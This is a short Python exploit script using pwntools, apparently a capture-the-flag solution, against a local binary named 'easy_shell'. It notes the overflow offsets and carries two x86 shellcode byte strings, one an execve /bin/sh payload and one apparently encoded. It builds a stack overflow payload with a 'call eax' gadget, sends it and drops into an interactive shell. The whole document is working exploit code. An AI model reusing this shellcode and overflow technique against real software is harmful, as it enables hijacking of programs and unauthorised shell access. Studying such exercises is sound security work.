from pwn import *

p = process("./easy_shell")

"EBP+0 found at offset: 50"
"EIP+0 found at offset: 54"
"Registers point to pattern buffer:"
"[EAX] --> offset 0 - size ~203"
"[ESP] --> offset 58 - size ~203"

#pause()
#gdb.attach(p)

shellcode2 = "\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c"

shellcode = "\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
call_eax = p32(0x080483e3) #: call eax

payload = "A"*(54 - len(shellcode)) + shellcode + call_eax

p.recvuntil("nom nom, shell> ")
p.sendline(payload)

p.interactive()
